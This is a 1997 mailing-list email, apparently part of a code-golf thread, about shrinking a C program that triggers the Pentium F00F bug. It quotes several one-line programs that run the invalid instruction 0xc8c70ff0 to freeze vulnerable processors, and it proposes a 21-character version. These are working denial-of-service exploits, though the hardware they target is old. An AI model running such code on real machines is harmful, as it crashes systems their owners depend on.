@@ -1,0 +1,46 @@
+From: Michael Stutz <stutz@dsl.org>
+Date: Sat, 15 Nov 1997 01:26:49 +0800
+To: Adam Back <aba@dcs.ex.ac.uk>
+Subject: Re: smaller f00f.c
+In-Reply-To: <199711141623.QAA03067@server.test.net>
+Message-ID: <Pine.LNX.3.95.971114120723.4898B-100000@devel.nacs.net>
+MIME-Version: 1.0
+Content-Type: text/plain
+
+
+
+On Fri, 14 Nov 1997, Adam Back wrote:
+
+> f00fie writes:
+> > In the grand tradition of RSA-in-3-lines-of-perl, we present
+> > Crash-A-Pentium-in-44-characters:
+> > 
+> >    main(){int i=0xc8c70ff0;void (*f)()=&i;f();}
+> 
+> Hey, challenge is on:
+> 
+> main(){int i=0xc8c70ff0;void (*f)()=&i;f();} /* f00fies 44 char */
+> main(){((int(*)())"\360\017\307\310")();}
+> main(){int i=0xc8c70ff0,(*f)()=&i;f();}
+> main(i){int(*f)()=&i;i=0xc8c70ff0;f();}
+> main(i){i=0xc8c70ff0;((int(*)())&i)();}
+> (*f)();main(i){f=&i;i=0xc8c70ff0;f();}
+> (*f)()="\360\017\307\310";main(){f();}       /* 38 chars */
+> 
+> Compiled with gcc.
+
+
+How about:
+
+long main[]={0xc8c70ff0};
+
+or even
+
+main[]={0xc8c70ff0}; /* 21 chars */
+
+Compiles with gcc, but I haven't tested it.
+
+
+
+
+
